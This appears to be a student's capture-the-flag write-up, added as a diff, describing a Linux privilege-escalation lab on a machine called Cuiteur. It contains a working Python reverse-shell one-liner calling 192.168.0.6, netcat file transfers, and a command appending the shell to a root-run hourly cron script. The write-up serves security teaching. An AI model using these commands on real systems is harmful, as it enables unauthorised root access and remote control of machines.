@@ -1,1 +1,28 @@
-flag{9f1f16}:
+flag{9f1f16}: Start DATATIME: Tuesday End DATATIME: Tuesday. Total time spend: 4h
+First of all I started reading all the files published on canvas about privilege scalation and after a long time trying diferent
+things I was not able no get into any direction that seemed reasonable so I needed to use the first hint. That one helped me a lot
+to know how to start and in what direcction should I continue. So I started making the things the hint said me that were:
+First of all downloading linuxprivchecker using wget:
+wget https://raw.githubusercontent.com/swarley7/linuxprivchecker/master/linuxprivchecker.py
+and then uploading linuxprivchecker.py with Netcat,opening a listener on Cuiteur to receive the file as on the previous exercice:
+$ netcat -l -p 1337 > linuxprivchecker.py
+Then, from the attacker machine, I uploaded linuxprivchecker.py:
+$ netcat 10.0.2.186 1337 < linuxprivchecker.py
+$ python linuxprivchecker.py
+After that I spend another hour searching for new information until I realized I wasn't advancing and I used the secong hint. That 
+hint told me to use linuxprivchecker to perform enumeration on the system and look for writeable files executed by root, as one 
+common vulnerability is misconfigured read-write-execute (rwx) privileges.If a file regularly executed by root is writeable 
+by non-root users, they can modify the file to execute their code with root privileges. So I realized that a page called 
+cuiteur-cleaning was suspicious and start exploting that one using cron job. Then I made the following steps:
+Into my own machine:
+nano shell.sh
+#!/bin/bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.6",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+nc -l -p 1338 < shell.sh
+nc -nvlp 6666
+Into the victime machine:
+cd /var/www/html
+nc 192.168.0.6 1338 > shell.sh
+echo "/bin/bash /var/www/html/shell.sh" >> /etc/cron.hourly/cuiteur-cleaning
+and waited for some minuts to get inside. After that I got a message that was:
+job control turned off and finally made an ls to get the flag :)
